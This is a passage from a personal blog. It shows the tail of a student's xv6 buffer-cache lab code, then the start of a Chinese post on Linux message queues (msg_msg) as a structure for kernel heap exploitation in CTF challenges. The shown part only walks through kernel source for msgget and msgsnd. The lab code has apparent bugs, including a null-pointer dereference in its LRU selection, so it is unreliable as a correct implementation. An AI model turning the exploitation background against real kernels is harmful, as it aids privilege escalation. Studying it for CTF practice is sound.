bcache.buckets[i].head.prev=&amp;bcache.buckets[i].head;</span><br><span class="line">    bcache.buckets[i].head.next=&amp;bcache.buckets[i].head;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(b = bcache.buf; b &lt; bcache.buf+NBUF; b++)&#123;</span><br><span class="line">    b-&gt;next = bcache.buckets[<span class="number">0</span>].head.next;</span><br><span class="line">    b-&gt;prev = &amp;bcache.buckets[<span class="number">0</span>].head;</span><br><span class="line">    <span class="built_in">snprintf</span>(b_lockname[i],<span class="keyword">sizeof</span>(b_lockname),<span class="string">&quot;buffer_%d&quot;</span>,i);</span><br><span class="line">    initsleeplock(&amp;b-&gt;lock,b_lockname[i]);</span><br><span class="line">    bcache.buckets[<span class="number">0</span>].head.next-&gt;prev = b;</span><br><span class="line">    bcache.buckets[<span class="number">0</span>].head.next = b;</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Look through buffer cache for block on device dev.</span></span><br><span class="line"><span class="comment">// If not found, allocate a buffer.</span></span><br><span class="line"><span class="comment">// In either case, return locked buffer.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct buf*</span></span><br><span class="line"><span class="function"><span class="title">bget</span><span class="params">(uint dev, uint blockno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">tmp</span>;</span></span><br><span class="line">  uint32 bid;</span><br><span class="line">  bid=HASH(blockno);</span><br><span class="line">  tmp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// // Is the block already cached?</span></span><br><span class="line">  <span class="comment">// for(b = bcache.head.next; b != &amp;bcache.head; b = b-&gt;next)&#123;</span></span><br><span class="line">  <span class="comment">//   if(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span></span><br><span class="line">  <span class="comment">//     b-&gt;refcnt++;</span></span><br><span class="line">  <span class="comment">//     release(&amp;bcache.lock);</span></span><br><span class="line">  <span class="comment">//     acquiresleep(&amp;b-&gt;lock);</span></span><br><span class="line">  <span class="comment">//     return b;</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">for</span>(b=bcache.buckets[bid].head.next;b!=&amp;bcache.buckets[bid].head;b=b-&gt;next)&#123;</span><br><span class="line">    <span class="keyword">if</span>(dev==b-&gt;dev&amp;&amp;blockno==b-&gt;blockno)&#123;</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      acquire(&amp;tickslock);</span><br><span class="line">      b-&gt;timetick = ticks;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">      <span class="comment">// printf(&quot;acq_sleep:%s\n&quot;,b-&gt;lock.name);</span></span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="comment">// printf(&quot;acq_sleep_end\n&quot;);</span></span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  b=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=bid,cur=<span class="number">0</span>;cur&lt;Bucket_size;i=(i+<span class="number">1</span>)%Bucket_size)&#123;</span><br><span class="line">    cur++;</span><br><span class="line">    <span class="keyword">if</span>(i!=bid)&#123;</span><br><span class="line">      <span class="keyword">if</span>(!holding(&amp;bcache.buckets[i].lock))&#123;</span><br><span class="line">        <span class="comment">// printf(&quot;asd\n&quot;);</span></span><br><span class="line">        <span class="comment">// printf(&quot;for_1_lock_acq:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">        acquire(&amp;bcache.buckets[i].lock);</span><br><span class="line">        <span class="comment">// printf(&quot;for_1_lock_acq_end:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(b=bcache.buckets[i].head.next;b!=&amp;bcache.buckets[i].head;b=b-&gt;next)&#123;</span><br><span class="line">      <span class="keyword">if</span>(b-&gt;refcnt==<span class="number">0</span>&amp;&amp;((b-&gt;timetick&lt;tmp-&gt;timetick)||tmp))&#123;</span><br><span class="line">        tmp=b;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tmp)&#123;</span><br><span class="line">      <span class="comment">// printf(&quot;tmp:%d,bif:%d\n&quot;,i,bid);</span></span><br><span class="line">      tmp-&gt;next-&gt;prev=tmp-&gt;prev;</span><br><span class="line">      tmp-&gt;prev-&gt;next=tmp-&gt;next;</span><br><span class="line">      release(&amp;bcache.buckets[i].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">      tmp-&gt;next=bcache.buckets[bid].head.next;</span><br><span class="line">      tmp-&gt;prev=&amp;bcache.buckets[bid].head;</span><br><span class="line">      bcache.buckets[bid].head.next-&gt;prev=tmp;</span><br><span class="line">      bcache.buckets[bid].head.next=tmp;</span><br><span class="line">      tmp-&gt;dev = dev;</span><br><span class="line">      tmp-&gt;blockno = blockno;</span><br><span class="line">      tmp-&gt;valid = <span class="number">0</span>;</span><br><span class="line">      tmp-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      acquire(&amp;tickslock);</span><br><span class="line">      tmp-&gt;timetick = ticks;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">      <span class="comment">// printf(&quot;for_acq_sleep:%s\n&quot;,tmp-&gt;lock.name);</span></span><br><span class="line">      acquiresleep(&amp;tmp-&gt;lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_acq_sleep_end\n&quot;);</span></span><br><span class="line">      <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      release(&amp;bcache.buckets[i].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Not cached.</span></span><br><span class="line">  <span class="comment">// Recycle the least recently used (LRU) unused buffer.</span></span><br><span class="line">  <span class="comment">// for(b = bcache.head.prev; b != &amp;bcache.head; b = b-&gt;prev)&#123;</span></span><br><span class="line">  <span class="comment">//   if(b-&gt;refcnt == 0) &#123;</span></span><br><span class="line">  <span class="comment">//     b-&gt;dev = dev;</span></span><br><span class="line">  <span class="comment">//     b-&gt;blockno = blockno;</span></span><br><span class="line">  <span class="comment">//     b-&gt;valid = 0;</span></span><br><span class="line">  <span class="comment">//     b-&gt;refcnt = 1;</span></span><br><span class="line">  <span class="comment">//     release(&amp;bcache.lock);</span></span><br><span class="line">  <span class="comment">//     acquiresleep(&amp;b-&gt;lock);</span></span><br><span class="line">  <span class="comment">//     return b;</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  panic(<span class="string">&quot;bget: no buffers&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a locked buf with the contents of the indicated block.</span></span><br><span class="line"><span class="function">struct buf*</span></span><br><span class="line"><span class="function"><span class="title">bread</span><span class="params">(uint dev, uint blockno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="comment">// printf(&quot;bread-beg\n&quot;);</span></span><br><span class="line">  b = bget(dev, blockno);</span><br><span class="line">  <span class="keyword">if</span>(!b-&gt;valid) &#123;</span><br><span class="line">    virtio_disk_rw(b, <span class="number">0</span>);</span><br><span class="line">    b-&gt;valid = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;bread-end\n&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write b&#x27;s contents to disk.  Must be locked.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bwrite</span><span class="params">(struct buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;bwrite&quot;</span>);</span><br><span class="line">  virtio_disk_rw(b, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Release a locked buffer.</span></span><br><span class="line"><span class="comment">// Move to the head of the most-recently-used list.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">brelse</span><span class="params">(struct buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint32 bid;</span><br><span class="line">  <span class="comment">// printf(&quot;brelse-beg\n&quot;);</span></span><br><span class="line">  bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;brelse&quot;</span>);</span><br><span class="line">  <span class="comment">// printf(&quot;re_sleep:%s\n&quot;,b-&gt;lock.name);</span></span><br><span class="line">  releasesleep(&amp;b-&gt;lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;brelse_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// printf(&quot;brelse-end\n&quot;);</span></span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  acquire(&amp;tickslock);</span><br><span class="line">  b-&gt;timetick = ticks;</span><br><span class="line">  release(&amp;tickslock);</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;brelse_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bpin</span><span class="params">(struct buf *b)</span> </span>&#123;</span><br><span class="line">  uint32 bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="comment">// printf(&quot;bpin_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  b-&gt;refcnt++;</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;bpin_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bunpin</span><span class="params">(struct buf *b)</span> </span>&#123;</span><br><span class="line">  uint32 bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="comment">// printf(&quot;bunpin_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;bunpin_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/17/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97msg%E5%AD%A6%E4%B9%A0-msg%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97msg%E5%AD%A6%E4%B9%A0-msg%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">消息队列msg学习&msg利用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-10-17 01:52:12 / 修改时间：01:52:35" itemprop="dateCreated datePublished" datetime="2022-10-17T01:52:12+08:00">2022-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="消息队列msg学习-amp-msg利用"><a href="#消息队列msg学习-amp-msg利用" class="headerlink" title="消息队列msg学习&amp;msg利用"></a>消息队列msg学习&amp;msg利用</h1><p>之前谢哥发了我两道kernelpwn的题目，都是比较简单的堆漏洞，但是堆的size不再是很好利用的0x20或者0x2e0了，然后搜了搜kernelpwn通用结构体发现还是没有当前size下可以利用的内核结构，经过谢哥提醒<code>msg</code>可以使用，但是看了会<code>msg</code>发现还是比较复杂的,然后就摆了，一摆就摆到了现在hh，痛定思痛，开始学习。</p>
<h2 id="msg学习"><a href="#msg学习" class="headerlink" title="msg学习"></a>msg学习</h2><h3 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h3><p>消息队列msg和共享内存一样是linux提供的一种进程间通信方式(IPC),一般称他为IPC对象，在Linux中使用key来唯一标识，而且他们是可持续化，当进程创建了一个IPC对象之后，这个对象不会因为进程的退出而销毁，而是一直存在，直到调用IPC删除函数来删除。</p>
<p>消息队列的IPC对象，key和id之间的关系如下图，其中key是唯一的，唯一确定一个IPC对象，但是每个进程的id是可以变化的，id就相当于文件描述符，key就相当于文件名，IPC对象相当于文件内容。</p>
<p><img src="https://img-blog.csdnimg.cn/20210407233522324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQzODc5Nw==,size_16,color_FFFFFF,t_70" alt="系统IPC对象"></p>
<h3 id="常用函数介绍"><a href="#常用函数介绍" class="headerlink" title="常用函数介绍"></a>常用函数介绍</h3><h4 id="ftok"><a href="#ftok" class="headerlink" title="ftok()"></a>ftok()</h4><p>产生键值<code>key_t ftok(const char *pathname, int proj_id);</code></p>
<h4 id="msgget"><a href="#msgget" class="headerlink" title="msgget()"></a>msgget()</h4><p>得到ipc对象的id值或者创建一个消息队列，当第一个参数可以是ftok创建的key或者<code>IPC_PRIVATE</code>，第二个参数控制创建消息队列的操作和读写权限。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>

<p>相关结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>当调用了msgget()函数的时候，内核会调用<code>ksys_msgget()</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> <span class="title">msg_ops</span> =</span> &#123;</span><br><span class="line">		.getnew = newque,</span><br><span class="line">		.associate = security_msg_queue_associate,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_params</span> <span class="title">msg_params</span>;</span></span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	msg_params.key = key;</span><br><span class="line">	msg_params.flg = msgflg;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipcget(ns, &amp;msg_ids(ns), &amp;msg_ops, &amp;msg_params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后调用<code>ipcget</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ipcget</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (params-&gt;key == IPC_PRIVATE)</span><br><span class="line">		<span class="keyword">return</span> ipcget_new(ns, ids, ops, params);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_public(ns, ids, ops, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当key=<code>IPC_PRIVATE</code>的时候，就会调用<code>ipcget_new()</code>创建一个新的消息队列</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ipcget_new</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;ids-&gt;rwsem);</span><br><span class="line">	err = ops-&gt;getnew(ns, params);</span><br><span class="line">	up_write(&amp;ids-&gt;rwsem);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数会调用<code>ops-&gt;getnew()</code>,在<code> ksys_msgget</code>函数中，这个函数指针被赋值成<code>newque</code>,也就是会调用<code>newque</code>函数,这个函数主要就是初始化结构体<code>msg_queue</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="msgsnd"><a href="#msgsnd" class="headerlink" title="msgsnd()"></a>msgsnd()</h4><p><code>msgsnd</code>函数会向指定id对应的消息队列发送消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span>  msqid , <span class="keyword">const</span> <span class="keyword">void</span> * msgp , <span class="keyword">size_t</span>  msgsz , <span class="keyword">int</span>  msgflg )</span></span>;</span><br></pre></td></tr></table></figure>

<p>相关结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span><span class="comment">//主消息段头部</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span> <span class="comment">//消息双向链表指针</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* 消息大小 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span> <span class="comment">//指向消息第二段</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* 后面接着消息的文本 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span><span class="comment">//子消息段头部</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span> <span class="comment">//指向下一段的指针，最多三段</span></span><br><span class="line">	<span class="comment">/* 后面接着消息第二/三段的文本 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>内核和执行<code>ksys_msgsnd()</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> mtype;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数调用<code>do_msgsnd()</code>函数</p>
